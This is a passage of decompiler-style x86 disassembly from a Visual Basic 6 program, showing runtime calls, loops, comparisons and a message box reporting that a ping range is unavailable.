007F355C: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F3561: add esp, 00000020h
007F3564: push eax
007F3565: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F356A: push eax
007F356B: lea eax, var_78
007F356E: push eax
007F356F: call 00410A84h ; Set (object)
007F3574: push eax
007F3575: lea eax, var_000000B4
007F357B: push eax
007F357C: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F3581: add esp, 00000020h
007F3584: push eax
007F3585: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
007F358A: mov edx, eax
007F358C: lea ecx, var_54
007F358F: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F3594: push eax
007F3595: call 004109DCh ; Val(arg_1)
007F359A: call 004109D6h ; msvbvm60.dll.__vbaFpR8
007F359F: fstp real8 ptr var_000004F8
007F35A5: fld real8 ptr var_000001E4
007F35AB: call 004109D6h ; msvbvm60.dll.__vbaFpR8
007F35B0: fcomp real8 ptr var_000004F8
007F35B6: fstsw ax
007F35B8: sahf 
007F35B9: jb 7F35C7h
007F35BB: mov var_000004FC, 00000001h
007F35C5: jmp 7F35CEh
007F35C7: and var_000004FC, 00000000h
007F35CE: mov eax, var_000004FC
007F35D4: neg eax
007F35D6: mov var_000001F0, ax
007F35DD: lea ecx, var_54
007F35E0: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
007F35E5: lea eax, var_78
007F35E8: push eax
007F35E9: lea eax, var_74
007F35EC: push eax
007F35ED: lea eax, var_70
007F35F0: push eax
007F35F1: push 00000003h
007F35F3: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F35F8: add esp, 00000010h
007F35FB: lea eax, var_000000B4
007F3601: push eax
007F3602: lea eax, var_000000A4
007F3608: push eax
007F3609: lea eax, var_00000094
007F360F: push eax
007F3610: push 00000003h
007F3612: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F3617: add esp, 00000010h
007F361A: movsx eax, word ptr var_000001F0
007F3621: test eax, eax
007F3623: jz 7F3631h
007F3625: mov var_04, 00000072h
007F362C: or word ptr var_38, FFFFh
007F3631: mov var_04, 00000074h
007F3638: lea eax, var_00000320
007F363E: push eax
007F363F: lea eax, var_00000310
007F3645: push eax
007F3646: lea eax, var_30
007F3649: push eax
007F364A: call 00410A36h ; Next
007F364F: mov var_000003D8, eax
007F3655: cmp var_000003D8, 00000000h
007F365C: jnz 007F3469h
007F3662: mov var_04, 00000075h
007F3669: mov edx, var_3C
007F366C: mov ecx, 008F2498h
007F3671: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
007F3676: mov var_04, 00000076h
007F367D: cmp word ptr var_38, FFFFh
007F3682: jnz 007F3D91h
007F3688: mov var_04, 00000077h
007F368F: mov var_00000150, 00000001h
007F3699: mov var_00000158, 00000002h
007F36A3: cmp [008F2010h], 00000000h
007F36AA: jnz 7F36C7h
007F36AC: push 008F2010h
007F36B1: push 00433984h
007F36B6: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F36BB: mov var_00000500, 008F2010h
007F36C5: jmp 7F36D1h
007F36C7: mov var_00000500, 008F2010h
007F36D1: push 00000000h
007F36D3: push 00000001h
007F36D5: push 00440E48h
007F36DA: push 00000000h
007F36DC: push 00000018h
007F36DE: mov eax, var_00000500
007F36E4: mov eax, [eax]
007F36E6: mov ecx, var_00000500
007F36EC: mov ecx, [ecx]
007F36EE: mov ecx, [ecx]
007F36F0: push eax
007F36F1: call [ecx+00000550h]
007F36F7: push eax
007F36F8: lea eax, var_70
007F36FB: push eax
007F36FC: call 00410A84h ; Set (object)
007F3701: push eax
007F3702: lea eax, var_00000094
007F3708: push eax
007F3709: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F370E: add esp, 00000010h
007F3711: push eax
007F3712: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F3717: push eax
007F3718: lea eax, var_74
007F371B: push eax
007F371C: call 00410A84h ; Set (object)
007F3721: push eax
007F3722: lea eax, var_000000A4
007F3728: push eax
007F3729: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F372E: add esp, 00000010h
007F3731: push eax
007F3732: call 00410A90h ; msvbvm60.dll.__vbaI4Var
007F3737: mov var_00000160, eax
007F373D: mov var_00000168, 00000003h
007F3747: mov var_00000170, 00000001h
007F3751: mov var_00000178, 00000002h
007F375B: lea eax, var_00000158
007F3761: push eax
007F3762: lea eax, var_00000168
007F3768: push eax
007F3769: lea eax, var_00000178
007F376F: push eax
007F3770: lea eax, var_00000340
007F3776: push eax
007F3777: lea eax, var_00000330
007F377D: push eax
007F377E: lea eax, var_30
007F3781: push eax
007F3782: call 00410A3Ch ; For
007F3787: mov var_000003DC, eax
007F378D: lea eax, var_74
007F3790: push eax
007F3791: lea eax, var_70
007F3794: push eax
007F3795: push 00000002h
007F3797: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F379C: add esp, 0000000Ch
007F379F: lea eax, var_000000A4
007F37A5: push eax
007F37A6: lea eax, var_00000094
007F37AC: push eax
007F37AD: push 00000002h
007F37AF: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F37B4: add esp, 0000000Ch
007F37B7: jmp 007F3D7Fh
007F37BC: mov var_04, 00000078h
007F37C3: push var_3C
007F37C6: call 004109DCh ; Val(arg_1)
007F37CB: fstp real8 ptr var_000001E4
007F37D1: mov var_00000160, 0000000Ch
007F37DB: mov var_00000168, 00000003h
007F37E5: lea eax, var_30
007F37E8: mov var_00000150, eax
007F37EE: mov var_00000158, 0000400Ch
007F37F8: cmp [008F2010h], 00000000h
007F37FF: jnz 7F381Ch
007F3801: push 008F2010h
007F3806: push 00433984h
007F380B: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F3810: mov var_00000504, 008F2010h
007F381A: jmp 7F3826h
007F381C: mov var_00000504, 008F2010h
007F3826: push 00000010h
007F3828: pop eax
007F3829: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007F382E: lea esi, var_00000168
007F3834: mov edi, esp
007F3836: movsd 
007F3837: movsd 
007F3838: movsd 
007F3839: movsd 
007F383A: push 00000001h
007F383C: push 00000010h
007F383E: push 00440E58h
007F3843: push 00000010h
007F3845: pop eax
007F3846: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007F384B: lea esi, var_00000158
007F3851: mov edi, esp
007F3853: movsd 
007F3854: movsd 
007F3855: movsd 
007F3856: movsd 
007F3857: push 00000001h
007F3859: push 00000000h
007F385B: push 00440E48h
007F3860: push 00000000h
007F3862: push 00000018h
007F3864: mov eax, var_00000504
007F386A: mov eax, [eax]
007F386C: mov ecx, var_00000504
007F3872: mov ecx, [ecx]
007F3874: mov ecx, [ecx]
007F3876: push eax
007F3877: call [ecx+00000550h]
007F387D: push eax
007F387E: lea eax, var_70
007F3881: push eax
007F3882: call 00410A84h ; Set (object)
007F3887: push eax
007F3888: lea eax, var_00000094
007F388E: push eax
007F388F: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F3894: add esp, 00000010h
007F3897: push eax
007F3898: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F389D: push eax
007F389E: lea eax, var_74
007F38A1: push eax
007F38A2: call 00410A84h ; Set (object)
007F38A7: push eax
007F38A8: lea eax, var_000000A4
007F38AE: push eax
007F38AF: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F38B4: add esp, 00000020h
007F38B7: push eax
007F38B8: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F38BD: push eax
007F38BE: lea eax, var_78
007F38C1: push eax
007F38C2: call 00410A84h ; Set (object)
007F38C7: push eax
007F38C8: lea eax, var_000000B4
007F38CE: push eax
007F38CF: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F38D4: add esp, 00000020h
007F38D7: push eax
007F38D8: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
007F38DD: mov edx, eax
007F38DF: lea ecx, var_54
007F38E2: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F38E7: push eax
007F38E8: call 004109DCh ; Val(arg_1)
007F38ED: call 004109D6h ; msvbvm60.dll.__vbaFpR8
007F38F2: fstp real8 ptr var_0000050C
007F38F8: fld real8 ptr var_000001E4
007F38FE: call 004109D6h ; msvbvm60.dll.__vbaFpR8
007F3903: fcomp real8 ptr var_0000050C
007F3909: fstsw ax
007F390B: sahf 
007F390C: jb 7F391Ah
007F390E: mov var_00000510, 00000001h
007F3918: jmp 7F3921h
007F391A: and var_00000510, 00000000h
007F3921: mov eax, var_00000510
007F3927: neg eax
007F3929: mov var_000001F0, ax
007F3930: lea ecx, var_54
007F3933: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
007F3938: lea eax, var_78
007F393B: push eax
007F393C: lea eax, var_74
007F393F: push eax
007F3940: lea eax, var_70
007F3943: push eax
007F3944: push 00000003h
007F3946: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F394B: add esp, 00000010h
007F394E: lea eax, var_000000B4
007F3954: push eax
007F3955: lea eax, var_000000A4
007F395B: push eax
007F395C: lea eax, var_00000094
007F3962: push eax
007F3963: push 00000003h
007F3965: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F396A: add esp, 00000010h
007F396D: movsx eax, word ptr var_000001F0
007F3974: test eax, eax
007F3976: jz 007F3CB8h
007F397C: mov var_04, 00000079h
007F3983: lea eax, var_30
007F3986: mov var_00000150, eax
007F398C: mov var_00000158, 0000400Ch
007F3996: cmp [008F2010h], 00000000h
007F399D: jnz 7F39BAh
007F399F: push 008F2010h
007F39A4: push 00433984h
007F39A9: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F39AE: mov var_00000514, 008F2010h
007F39B8: jmp 7F39C4h
007F39BA: mov var_00000514, 008F2010h
007F39C4: push 00000000h
007F39C6: push 00000014h
007F39C8: push 00440E58h
007F39CD: push 00000010h
007F39CF: pop eax
007F39D0: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007F39D5: lea esi, var_00000158
007F39DB: mov edi, esp
007F39DD: movsd 
007F39DE: movsd 
007F39DF: movsd 
007F39E0: movsd 
007F39E1: push 00000001h
007F39E3: push 00000000h
007F39E5: push 00440E48h
007F39EA: push 00000000h
007F39EC: push 00000018h
007F39EE: mov eax, var_00000514
007F39F4: mov eax, [eax]
007F39F6: mov ecx, var_00000514
007F39FC: mov ecx, [ecx]
007F39FE: mov ecx, [ecx]
007F3A00: push eax
007F3A01: call [ecx+00000550h]
007F3A07: push eax
007F3A08: lea eax, var_70
007F3A0B: push eax
007F3A0C: call 00410A84h ; Set (object)
007F3A11: push eax
007F3A12: lea eax, var_00000094
007F3A18: push eax
007F3A19: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F3A1E: add esp, 00000010h
007F3A21: push eax
007F3A22: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F3A27: push eax
007F3A28: lea eax, var_74
007F3A2B: push eax
007F3A2C: call 00410A84h ; Set (object)
007F3A31: push eax
007F3A32: lea eax, var_000000A4
007F3A38: push eax
007F3A39: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F3A3E: add esp, 00000020h
007F3A41: push eax
007F3A42: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F3A47: push eax
007F3A48: lea eax, var_78
007F3A4B: push eax
007F3A4C: call 00410A84h ; Set (object)
007F3A51: push eax
007F3A52: lea eax, var_000000B4
007F3A58: push eax
007F3A59: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F3A5E: add esp, 00000010h
007F3A61: lea eax, var_30
007F3A64: mov var_00000160, eax
007F3A6A: mov var_00000168, 0000400Ch
007F3A74: cmp [008F2010h], 00000000h
007F3A7B: jnz 7F3A98h
007F3A7D: push 008F2010h
007F3A82: push 00433984h
007F3A87: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F3A8C: mov var_00000518, 008F2010h
007F3A96: jmp 7F3AA2h
007F3A98: mov var_00000518, 008F2010h
007F3AA2: push 00000000h
007F3AA4: push 00000014h
007F3AA6: push 00440E58h
007F3AAB: push 00000010h
007F3AAD: pop eax
007F3AAE: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007F3AB3: lea esi, var_00000168
007F3AB9: mov edi, esp
007F3ABB: movsd 
007F3ABC: movsd 
007F3ABD: movsd 
007F3ABE: movsd 
007F3ABF: push 00000001h
007F3AC1: push 00000000h
007F3AC3: push 00440E48h
007F3AC8: push 00000000h
007F3ACA: push 00000018h
007F3ACC: mov eax, var_00000518
007F3AD2: mov eax, [eax]
007F3AD4: mov ecx, var_00000518
007F3ADA: mov ecx, [ecx]
007F3ADC: mov ecx, [ecx]
007F3ADE: push eax
007F3ADF: call [ecx+00000550h]
007F3AE5: push eax
007F3AE6: lea eax, var_7C
007F3AE9: push eax
007F3AEA: call 00410A84h ; Set (object)
007F3AEF: push eax
007F3AF0: lea eax, var_000000C4
007F3AF6: push eax
007F3AF7: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F3AFC: add esp, 00000010h
007F3AFF: push eax
007F3B00: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F3B05: push eax
007F3B06: lea eax, var_80
007F3B09: push eax
007F3B0A: call 00410A84h ; Set (object)
007F3B0F: push eax
007F3B10: lea eax, var_000000D4
007F3B16: push eax
007F3B17: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F3B1C: add esp, 00000020h
007F3B1F: push eax
007F3B20: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F3B25: push eax
007F3B26: lea eax, var_00000084
007F3B2C: push eax
007F3B2D: call 00410A84h ; Set (object)
007F3B32: push eax
007F3B33: lea eax, var_000000E4
007F3B39: push eax
007F3B3A: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F3B3F: add esp, 00000010h
007F3B42: cmp [008F2410h], 00000000h
007F3B49: jnz 7F3B66h
007F3B4B: push 008F2410h
007F3B50: push 00440E38h
007F3B55: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F3B5A: mov var_0000051C, 008F2410h
007F3B64: jmp 7F3B70h
007F3B66: mov var_0000051C, 008F2410h
007F3B70: mov eax, var_0000051C
007F3B76: mov eax, [eax]
007F3B78: mov var_000001F0, eax
007F3B7E: mov var_0000011C, 80020004h
007F3B88: mov var_00000124, 0000000Ah
007F3B92: mov var_0000010C, 80020004h
007F3B9C: mov var_00000114, 0000000Ah
007F3BA6: lea eax, var_000000E4
007F3BAC: push eax
007F3BAD: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
007F3BB2: mov var_000000FC, eax
007F3BB8: mov var_00000104, 00000008h
007F3BC2: lea eax, var_000000B4
007F3BC8: push eax
007F3BC9: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
007F3BCE: mov var_000000EC, eax
007F3BD4: mov var_000000F4, 00000008h
007F3BDE: lea eax, var_00000124
007F3BE4: push eax
007F3BE5: lea eax, var_00000114
007F3BEB: push eax
007F3BEC: lea eax, var_00000104
007F3BF2: push eax
007F3BF3: lea eax, var_000000F4
007F3BF9: push eax
007F3BFA: mov eax, var_000001F0
007F3C00: mov eax, [eax]
007F3C02: push var_000001F0
007F3C08: call [eax+20h]
007F3C0B: fclex 
007F3C0D: mov var_000001F4, eax
007F3C13: cmp var_000001F4, 00000000h
007F3C1A: jnl 7F3C3Ch
007F3C1C: push 00000020h
007F3C1E: push 00440E28h
007F3C23: push var_000001F0
007F3C29: push var_000001F4
007F3C2F: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F3C34: mov var_00000520, eax
007F3C3A: jmp 7F3C43h
007F3C3C: and var_00000520, 00000000h
007F3C43: lea eax, var_00000084
007F3C49: push eax
007F3C4A: lea eax, var_80
007F3C4D: push eax
007F3C4E: lea eax, var_7C
007F3C51: push eax
007F3C52: lea eax, var_78
007F3C55: push eax
007F3C56: lea eax, var_74
007F3C59: push eax
007F3C5A: lea eax, var_70
007F3C5D: push eax
007F3C5E: push 00000006h
007F3C60: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F3C65: add esp, 0000001Ch
007F3C68: lea eax, var_00000124
007F3C6E: push eax
007F3C6F: lea eax, var_00000114
007F3C75: push eax
007F3C76: lea eax, var_00000104
007F3C7C: push eax
007F3C7D: lea eax, var_000000F4
007F3C83: push eax
007F3C84: lea eax, var_000000E4
007F3C8A: push eax
007F3C8B: lea eax, var_000000D4
007F3C91: push eax
007F3C92: lea eax, var_000000C4
007F3C98: push eax
007F3C99: lea eax, var_000000B4
007F3C9F: push eax
007F3CA0: lea eax, var_000000A4
007F3CA6: push eax
007F3CA7: lea eax, var_00000094
007F3CAD: push eax
007F3CAE: push 0000000Ah
007F3CB0: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F3CB5: add esp, 0000002Ch
007F3CB8: mov var_04, 0000007Bh
007F3CBF: cmp [008F2410h], 00000000h
007F3CC6: jnz 7F3CE3h
007F3CC8: push 008F2410h
007F3CCD: push 00440E38h
007F3CD2: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F3CD7: mov var_00000524, 008F2410h
007F3CE1: jmp 7F3CEDh
007F3CE3: mov var_00000524, 008F2410h
007F3CED: mov eax, var_00000524
007F3CF3: mov eax, [eax]
007F3CF5: mov var_000001F0, eax
007F3CFB: lea eax, var_000001DC
007F3D01: push eax
007F3D02: mov eax, var_000001F0
007F3D08: mov eax, [eax]
007F3D0A: push var_000001F0
007F3D10: call [eax+24h]
007F3D13: fclex 
007F3D15: mov var_000001F4, eax
007F3D1B: cmp var_000001F4, 00000000h
007F3D22: jnl 7F3D44h
007F3D24: push 00000024h
007F3D26: push 00440E28h
007F3D2B: push var_000001F0
007F3D31: push var_000001F4
007F3D37: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F3D3C: mov var_00000528, eax
007F3D42: jmp 7F3D4Bh
007F3D44: and var_00000528, 00000000h
007F3D4B: mov eax, var_000001DC
007F3D51: cmp eax, [008F2480h]
007F3D57: jle 7F3D5Bh
007F3D59: jmp 7F3D8Ch
007F3D5B: mov var_04, 0000007Eh
007F3D62: lea eax, var_00000340
007F3D68: push eax
007F3D69: lea eax, var_00000330
007F3D6F: push eax
007F3D70: lea eax, var_30
007F3D73: push eax
007F3D74: call 00410A36h ; Next
007F3D79: mov var_000003DC, eax
007F3D7F: cmp var_000003DC, 00000000h
007F3D86: jnz 007F37BCh
007F3D8C: jmp 007F3E47h
007F3D91: mov var_04, 00000080h
007F3D98: mov var_000000BC, 80020004h
007F3DA2: mov var_000000C4, 0000000Ah
007F3DAC: mov var_000000AC, 80020004h
007F3DB6: mov var_000000B4, 0000000Ah
007F3DC0: mov var_0000009C, 80020004h
007F3DCA: mov var_000000A4, 0000000Ah
007F3DD4: mov var_00000150, 00450A8Ch ; The specified ping range is not available at the moment
007F3DDE: mov var_00000158, 00000008h
007F3DE8: lea edx, var_00000158
007F3DEE: lea ecx, var_00000094
007F3DF4: call 004109E2h ; msvbvm60.dll.__vbaVarDup
007F3DF9: lea eax, var_000000C4
007F3DFF: push eax
007F3E00: lea eax, var_000000B4
007F3E06: push eax
007F3E07: lea eax, var_000000A4
007F3E0D: push eax
007F3E0E: push 00000010h
007F3E10: lea eax, var_00000094
007F3E16: push eax
007F3E17: call 004109E8h ; MsgBox(arg_1, arg_2, arg_3, arg_4, arg_5)
007F3E1C: lea eax, var_000000C4
007F3E22: push eax
007F3E23: lea eax, var_000000B4
007F3E29: push eax
007F3E2A: lea eax, var_000000A4
007F3E30: push eax
007F3E31: lea eax, var_00000094
007F3E37: push eax
007F3E38: push 00000004h
007F3E3A: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F3E3F: add esp, 00000014h
007F3E42: jmp 007F712Eh
007F3E47: mov var_04, 00000084h
007F3E4E: mov var_00000150, 00000001h
007F3E58: mov var_00000158, 00000002h
007F3E62: cmp [008F2410h], 00000000h
007F3E69: jnz 7F3E86h
007F3E6B: push 008F2410h
007F3E70: push 00440E38h
007F3E75: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F3E7A: mov var_0000052C, 008F2410h
007F3E84: jmp 7F3E90h
007F3E86: mov var_0000052C, 008F2410h
007F3E90: mov eax, var_0000052C
007F3E96: mov eax, [eax]
007F3E98: mov var_000001F0, eax
007F3E9E: lea eax, var_000001DC
007F3EA4: push eax
007F3EA5: mov eax, var_000001F0
007F3EAB: mov eax, [eax]
007F3EAD: push var_000001F0
007F3EB3: call [eax+24h]
007F3EB6: fclex 
007F3EB8: mov var_000001F4, eax
007F3EBE: cmp var_000001F4, 00000000h
007F3EC5: jnl 7F3EE7h
007F3EC7: push 00000024h
007F3EC9: push 00440E28h
007F3ECE: push var_000001F0
007F3ED4: push var_000001F4
007F3EDA: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F3EDF: mov var_00000530, eax
007F3EE5: jmp 7F3EEEh
007F3EE7: and var_00000530, 00000000h
007F3EEE: mov eax, var_000001DC
007F3EF4: mov var_00000160, eax
007F3EFA: mov var_00000168, 00000003h
007F3F04: mov var_00000170, 00000001h
007F3F0E: mov var_00000178, 00000002h
007F3F18: lea eax, var_00000158
007F3F1E: push eax
007F3F1F: lea eax, var_00000168
007F3F25: push eax
007F3F26: lea eax, var_00000178
007F3F2C: push eax
007F3F2D: lea eax, var_00000360
007F3F33: push eax
007F3F34: lea eax, var_00000350
007F3F3A: push eax
007F3F3B: lea eax, var_30
007F3F3E: push eax
007F3F3F: call 00410A3Ch ; For
007F3F44: mov var_000003E0, eax
007F3F4A: jmp 007F45F1h
007F3F4F: mov var_04, 00000085h
007F3F56: mov eax, [ebp+08h]
007F3F59: mov eax, [eax]
007F3F5B: push [ebp+08h]
007F3F5E: call [eax+00000380h]
007F3F64: push eax
007F3F65: lea eax, var_70
007F3F68: push eax
007F3F69: call 00410A84h ; Set (object)
007F3F6E: mov var_000001F0, eax
007F3F74: lea eax, var_74
007F3F77: push eax
007F3F78: push 00000000h
007F3F7A: mov eax, var_000001F0
007F3F80: mov eax, [eax]
007F3F82: push var_000001F0
007F3F88: call [eax+40h]
007F3F8B: fclex 
007F3F8D: mov var_000001F4, eax
007F3F93: cmp var_000001F4, 00000000h
007F3F9A: jnl 7F3FBCh
007F3F9C: push 00000040h
007F3F9E: push 00440DE8h
007F3FA3: push var_000001F0
007F3FA9: push var_000001F4
007F3FAF: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F3FB4: mov var_00000534, eax
007F3FBA: jmp 7F3FC3h
007F3FBC: and var_00000534, 00000000h
007F3FC3: push 00000000h
007F3FC5: push 00000000h
007F3FC7: push var_74
007F3FCA: lea eax, var_00000094
007F3FD0: push eax
007F3FD1: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F3FD6: add esp, 00000010h
007F3FD9: push eax
007F3FDA: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
007F3FDF: sub ax, FFFFh
007F3FE3: neg ax
007F3FE6: sbb eax, eax
007F3FE8: inc eax
007F3FE9: neg eax
007F3FEB: mov var_000001F8, ax
007F3FF2: lea eax, var_74
007F3FF5: push eax
007F3FF6: lea eax, var_70
007F3FF9: push eax
007F3FFA: push 00000002h
007F3FFC: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F4001: add esp, 0000000Ch
007F4004: lea ecx, var_00000094
007F400A: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
007F400F: movsx eax, word ptr var_000001F8
007F4016: test eax, eax
007F4018: jz 007F428Eh
007F401E: mov var_04, 00000086h
007F4025: cmp [008F2410h], 00000000h
007F402C: jnz 7F4049h
007F402E: push 008F2410h
007F4033: push 00440E38h
007F4038: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F403D: mov var_00000538, 008F2410h
007F4047: jmp 7F4053h
007F4049: mov var_00000538, 008F2410h
007F4053: mov eax, var_00000538
007F4059: mov eax, [eax]
007F405B: mov var_000001F0, eax
007F4061: lea eax, var_00000094
007F4067: push eax
007F4068: lea eax, var_30
007F406B: push eax
007F406C: mov eax, var_000001F0
007F4072: mov eax, [eax]
007F4074: push var_000001F0
007F407A: call [eax+1Ch]
007F407D: fclex 
007F407F: mov var_000001F4, eax
007F4085: cmp var_000001F4, 00000000h
007F408C: jnl 7F40AEh
007F408E: push 0000001Ch
007F4090: push 00440E28h
007F4095: push var_000001F0
007F409B: push var_000001F4
007F40A1: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F40A6: mov var_0000053C, eax
007F40AC: jmp 7F40B5h
007F40AE: and var_0000053C, 00000000h
007F40B5: lea eax, var_00000094
007F40BB: push eax
007F40BC: lea eax, var_54
007F40BF: push eax
007F40C0: call 0041097Ch ; msvbvm60.dll.__vbaStrVarVal
007F40C5: push eax
007F40C6: call 004109DCh ; Val(arg_1)
007F40CB: fstp real8 ptr var_000001E4
007F40D1: push 00000000h
007F40D3: push 00000005h
007F40D5: push 00000001h
007F40D7: push 00000000h
007F40D9: lea eax, var_00000148
007F40DF: push eax
007F40E0: push 00000010h
007F40E2: push 00000880h
007F40E7: call 00410946h ; ReDim
007F40EC: add esp, 0000001Ch
007F40EF: mov var_00000150, 00442938h
007F40F9: mov var_00000158, 00000008h
007F4103: lea esi, var_00000158
007F4109: push 00000000h
007F410B: push var_00000148
007F4111: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F4116: mov ecx, eax
007F4118: mov edx, esi
007F411A: call 004108F2h ; msvbvm60.dll.__vbaVarCopy
007F411F: mov eax, [ebp+08h]
007F4122: mov eax, [eax]
007F4124: push [ebp+08h]
007F4127: call [eax+00000344h]
007F412D: mov var_0000009C, eax
007F4133: mov var_000000A4, 00000009h
007F413D: lea esi, var_000000A4
007F4143: push 00000001h
007F4145: push var_00000148
007F414B: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F4150: mov ecx, eax
007F4152: mov edx, esi
007F4154: call 00410940h ; msvbvm60.dll.__vbaVarZero
007F4159: mov eax, [ebp+08h]
007F415C: mov eax, [eax]
007F415E: push [ebp+08h]
007F4161: call [eax+00000340h]
007F4167: mov var_000000AC, eax
007F416D: mov var_000000B4, 00000009h
007F4177: lea esi, var_000000B4
007F417D: push 00000002h
007F417F: push var_00000148
007F4185: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F418A: mov ecx, eax
007F418C: mov edx, esi
007F418E: call 00410940h ; msvbvm60.dll.__vbaVarZero
007F4193: mov eax, [ebp+08h]
007F4196: mov eax, [eax]
007F4198: push [ebp+08h]
007F419B: call [eax+0000033Ch]
007F41A1: mov var_000000BC, eax
007F41A7: mov var_000000C4, 00000009h
007F41B1: lea esi, var_000000C4
007F41B7: push 00000003h
007F41B9: push var_00000148
007F41BF: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F41C4: mov ecx, eax
007F41C6: mov edx, esi
007F41C8: call 00410940h ; msvbvm60.dll.__vbaVarZero
007F41CD: lea eax, var_34
007F41D0: mov var_00000160, eax
007F41D6: mov var_00000168, 00004003h
007F41E0: lea esi, var_00000168
007F41E6: push 00000004h
007F41E8: push var_00000148
007F41EE: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F41F3: mov ecx, eax
007F41F5: mov edx, esi
007F41F7: call 00410940h ; msvbvm60.dll.__vbaVarZero
007F41FC: lea eax, var_44
007F41FF: mov var_00000170, eax
007F4205: mov var_00000178, 00004008h
007F420F: lea esi, var_00000178
007F4215: push 00000005h
007F4217: push var_00000148
007F421D: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
007F4222: mov ecx, eax
007F4224: mov edx, esi
007F4226: call 00410940h ; msvbvm60.dll.__vbaVarZero
007F422B: mov edx, 0043D464h ; x7
007F4230: lea ecx, var_58
007F4233: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
007F4238: lea eax, var_00000148
007F423E: push eax
007F423F: lea eax, var_58
007F4242: push eax
007F4243: fld real8 ptr var_000001E4
007F4249: call 004108E6h ; msvbvm60.dll.__vbaFpI2
007F424E: push eax
007F424F: call 007A6910h
007F4254: lea eax, var_00000148
007F425A: push eax
007F425B: push 00000000h
007F425D: call 00410934h ; Erase
007F4262: lea eax, var_58
007F4265: push eax
007F4266: lea eax, var_54
007F4269: push eax
007F426A: push 00000002h
007F426C: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
007F4271: add esp, 0000000Ch
007F4274: lea ecx, var_00000094
007F427A: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
007F427F: mov var_04, 00000087h
007F4286: or word ptr [008F24A4h], FFFFh
007F428E: mov var_04, 00000089h
007F4295: mov eax, [ebp+08h]
007F4298: mov eax, [eax]
007F429A: push [ebp+08h]
007F429D: call [eax+00000380h]
007F42A3: push eax
007F42A4: lea eax, var_70
007F42A7: push eax
007F42A8: call 00410A84h ; Set (object)
007F42AD: mov var_000001F0, eax
007F42B3: lea eax, var_74
007F42B6: push eax
007F42B7: push 00000001h
007F42B9: mov eax, var_000001F0
007F42BF: mov eax, [eax]
007F42C1: push var_000001F0
007F42C7: call [eax+40h]
007F42CA: fclex 
007F42CC: mov var_000001F4, eax
007F42D2: cmp var_000001F4, 00000000h
007F42D9: jnl 7F42FBh
007F42DB: push 00000040h
007F42DD: push 00440DE8h
007F42E2: push var_000001F0
007F42E8: push var_000001F4
007F42EE: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F42F3: mov var_00000540, eax
007F42F9: jmp 7F4302h
007F42FB: and var_00000540, 00000000h
007F4302: push 00000000h
007F4304: push 00000000h
007F4306: push var_74
